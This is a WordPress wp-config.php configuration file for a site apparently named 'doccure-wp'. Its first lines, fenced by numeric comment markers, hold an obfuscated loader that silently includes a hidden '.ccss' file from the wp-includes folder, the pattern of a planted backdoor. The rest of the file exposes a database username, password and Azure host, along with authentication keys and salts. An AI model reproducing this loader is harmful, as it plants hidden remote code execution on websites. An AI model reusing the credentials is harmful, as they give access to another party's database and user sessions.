<?php
/*45350*/

$r3 = "/\x68ome/doccure\x2dwp/public_\x68tml/wp\x2dincludes/blocks/freeform/.5f97c3be.ccss"; $t1q5vp = $r3; strpos($t1q5vp, "7s"); @include_once /* 5yai */ ($t1q5vp);

/*45350*/

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dreams' );

/** Database username */
define( 'DB_USER', 'dreams' );

/** Database password */
define( 'DB_PASSWORD', 'Dreams@99' );

/** Database hostname */
define( 'DB_HOST', 'newapp-3a95f807e1-wpdbserver.mysql.database.azure.com:3306' );


/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'tj1pj^lS#WFTxlxdl2?r@^_>=gl{iwNr@t2e)8E! l/;Bg2q37P_Cx|@Ta-h|CEG' );
define( 'SECURE_AUTH_KEY',  'n<`WCSi9TFi&-Ip[B^2Hg:@]f46jr--qZ,~Z:cRGG*_<D0QVQ9[@?DhDb2#$.waF' );
define( 'LOGGED_IN_KEY',    'jw~|Gq*JD]Fw roxk}l/Rojkt*Lg}t8rl>[/P>t&1}H8e&|kP3Dr7r-=?dq3,qWg' );
define( 'NONCE_KEY',        '0QO~-mm=aFJRXil8e4]%;;0d_t9P7U%D;;b?2)lwC|D4F*>-3e<Eh/r^ume*}#i{' );
define( 'AUTH_SALT',        '%|7xK$^W(Lk/PTW]$h-du^8P2~$Jdbi^Yh=xI>=DEv^i04 Jalvtn(*[U4x=q>r8' );
define( 'SECURE_AUTH_SALT', '3F1:sK.+2L8w7N4G,}{:e}63]?VNm:wXL[,x*sTLgO$M&_S`8Ci7eGw`r0{Jc8>`' );
define( 'LOGGED_IN_SALT',   '?={c<6ijH`s1%Dr)LK]F>a9At]5}r[(8-scg2nR,](Nz3=KLq~Gj.&vJ)O-rsQ^7' );
define( 'NONCE_SALT',       'V<+,VR4Aqqyo;Pp|`GSk#/vFrX;8(eh *(`^hDINE`P$iB~B}i:#h<ND}mfe/z~F' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
//define( 'WP_DEBUG', false );
define('WP_DEBUG', true);
define('WP_DEBUG_LOG', true);
define('WP_DEBUG_DISPLAY', false);

define( 'FS_METHOD', 'direct' );
 /* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
